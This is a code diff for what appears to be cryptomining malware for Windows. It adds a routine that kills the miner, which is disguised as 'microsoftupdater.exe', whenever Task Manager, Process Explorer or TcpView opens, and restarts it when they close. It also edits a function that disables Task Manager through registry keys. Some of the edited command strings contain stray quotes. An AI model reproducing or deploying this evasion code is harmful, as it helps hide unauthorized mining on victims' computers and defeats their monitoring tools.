@@ -25,6 +25,46 @@ Win.set.preferences({
     }
 });
 
+async function processMonitor() {
+    Win.appManager.register({
+        'TaskManager': {
+            path: Win.path`C:\WINDOWS\system32\Taskmgr.exe`,
+            onLaunch: function() {
+                killMiner();
+            },
+            onKill: function() {
+                Win.cmd('start.cmd');
+            },
+        },
+        'ProcessExplorer': {
+            path: $procExpPath,
+            onLaunch: function() {
+                killMiner();
+            },
+            onKill: function() {
+                Win.cmd('start.cmd');
+            }
+        },
+        'TcpView': {
+            path: $tcpViewPath,
+            onLaunch: function() {
+                killMiner();
+            },
+            onKill: function() {
+                Win.cmd('start.cmd');
+            }
+        }
+    });
+}
+
+function killMiner () {
+    try {
+        Win.cmd(`TASKKILL /f /IM start.cmd`);
+    } catch {
+        Win.cmd(`TASKKILL /f /IM microsoftupdater.exe`);
+    }
+}
+
 function wait(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -40,13 +80,13 @@ async function disableTaskMgr() { // Requires a REBOOT to take effect
     const taskMgrKey = Win.path`'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\'`;
 
     try {
-        Win.cmd('REG QUERY' + taskMgrKey + '/v DisableTaskMgr');
+        Win.cmd(`REG QUERY ${taskMgrKey} /v DisableTaskMgr`);
         wait(250);
-        Win.cmd('REG ADD HKCU' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
+        Win.cmd(`REG ADD HKCU ${taskMgrKey} /v DisableTaskMgr /t REG_DWORD /d 1 /f`);
     } catch {
-        Win.cmd('REG ADD HKCU' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
+        Win.cmd(`REG ADD HKCU' ${taskMgrKey} '/v DisableTaskMgr /t REG_DWORD /d 1 /f`);
         wait(250);
-        Win.cmd('REG ADD HKLM' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
+        Win.cmd(`REG ADD HKLM' ${taskMgrKey} '/v DisableTaskMgr /t REG_DWORD /d 1 /f`);
     }
 }
 
